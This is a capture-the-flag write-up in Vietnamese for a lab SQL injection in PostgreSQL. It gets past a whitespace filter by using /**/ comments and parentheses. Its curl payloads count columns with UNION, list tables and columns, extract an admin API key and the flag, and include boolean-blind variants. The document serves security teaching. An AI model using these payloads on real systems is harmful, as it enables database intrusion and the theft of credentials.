# SQLi-044: PostgreSQL Whitespace Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Whitespace Filter Bypass bằng parentheses  
**DBMS:** PostgreSQL  
**Flag:** `FLAG{wh1t3sp4c3_p4r3nth3s3s_byp4ss}`

---

## 🔍 Bước 1: DETECT - Phát Hiện Lỗ Hổng

### 1.1. Phân tích ứng dụng

```bash
# Request bình thường
curl "http://localhost:5044/api/user?id=1"
# → Response: Thông tin user id=1

# Thử injection với space
curl "http://localhost:5044/api/user?id=1 OR 1=1"
# → Response: "Whitespace characters are not allowed in API requests."
```

### 1.2. Xác định filter

WAF đang chặn TẤT CẢ whitespace characters (space, tab, newline). Tuy nhiên, comment `/**/` không bị coi là whitespace nên có thể bypass!

### 1.3. Test bypass với /\*\*/

```bash
# Test với subquery
curl "http://localhost:5044/api/user?id=(select/**/1/**/where/**/1=1)"
# → Response: Trả về user id=1 → SQLi confirmed!

# Test với subquery false condition
curl "http://localhost:5044/api/user?id=(select/**/1/**/where/**/1=2)"
# → Response: No user found → Confirmed có thể control logic!
```

**SQLi confirmed! WAF chỉ chặn whitespace characters nhưng không chặn comment `/**/`\*\*

---

## 🎯 Bước 2: IDENTIFY - Xác Định DBMS

### 2.1. PostgreSQL-specific test

```bash
# Test :: casting syntax (PostgreSQL specific)
curl "http://localhost:5044/api/user?id=1::int"
# → Hoạt động bình thường → PostgreSQL!

# Test version() với subquery
curl "http://localhost:5044/api/user?id=(select/**/1/**/from/**/generate_series(1,1))"
# → Hoạt động → generate_series là PostgreSQL-specific function
```

---

## 🔢 Bước 3: ENUMERATE - Xác Định Cấu Trúc

### 3.1. Đếm số cột bằng UNION

```bash
# Thử 1 cột
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/NULL"
# → Error: each UNION query must have the same number of columns

# Thử 2 cột
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/NULL,NULL"
# → Error

# Thử 3 cột
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/NULL,NULL,NULL"
# → Error

# Thử 4 cột
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL"
# → Success! → Query có 4 cột: id, username, email, status
```

### 3.2. Liệt kê tên bảng

```bash
# Extract table names từ information_schema
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,table_name,'a','a'/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema='public'"
```

**Kết quả:**

- users
- api_keys
- flags ← **Target**

### 3.3. Liệt kê cột của bảng flags

```bash
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,column_name,'a','a'/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='flags'"
```

**Kết quả:** id, name, value

### 3.4. Liệt kê cột của bảng api_keys

```bash
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,column_name,'a','a'/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='api_keys'"
```

**Kết quả:** id, user_id, api_key, permissions

---

## ⬆️ Bước 4: ESCALATE - Trích Xuất Dữ Liệu Nhạy Cảm

### 4.1. Extract admin API key

```bash
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,api_key,permissions,'a'/**/FROM/**/api_keys/**/WHERE/**/permissions='admin'"
```

**Kết quả:**
| api_key | permissions |
|---------|-------------|
| pk_admin_SUPER_SECRET_KEY_2024 | admin |

---

## 🏆 Bước 5: EXFILTRATE - Lấy Flag

### 5.1. Extract flag từ bảng flags

```bash
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,name,value,'a'/**/FROM/**/flags"
```

**Kết quả:**

🎉 **FLAG:** `FLAG{wh1t3sp4c3_p4r3nth3s3s_byp4ss}`

---

## 🔧 Alternative Payload Techniques

### Sử dụng Boolean Blind với subquery

```bash
# Test first character của flag
curl "http://localhost:5044/api/user?id=(select/**/case/**/when/**/substr(value,1,1)='F'/**/then/**/1/**/else/**/0/**/end/**/from/**/flags)"
# → Trả về user id=1 nếu đúng
```

### Sử dụng subquery nested để extract trực tiếp

```bash
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,(select/**/value/**/from/**/flags/**/limit/**/1),'a','a'"
```

### Sử dụng CAST để convert types

```bash
curl "http://localhost:5044/api/user?id=-1/**/UNION/**/SELECT/**/1,name::text,value::text,4::text/**/FROM/**/flags"
```

---

## 📝 Tổng Kết Payloads

| Giai đoạn     | Payload                                                                                                                  |
| ------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Test SQLi     | `(select/**/1/**/where/**/1=1)`                                                                                          |
| Count Columns | `-1/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL`                                                                           |
| List Tables   | `-1/**/UNION/**/SELECT/**/1,table_name,'abc','a'/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema='public'` |
| List Columns  | `-1/**/UNION/**/SELECT/**/1,column_name,'abc','a'/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='flags'`  |
| Get Flag      | `-1/**/UNION/**/SELECT/**/1,name,value,'a'/**/FROM/**/flags`                                                             |

---

## ✅ Flag

```
FLAG{wh1t3sp4c3_p4r3nth3s3s_byp4ss}
```
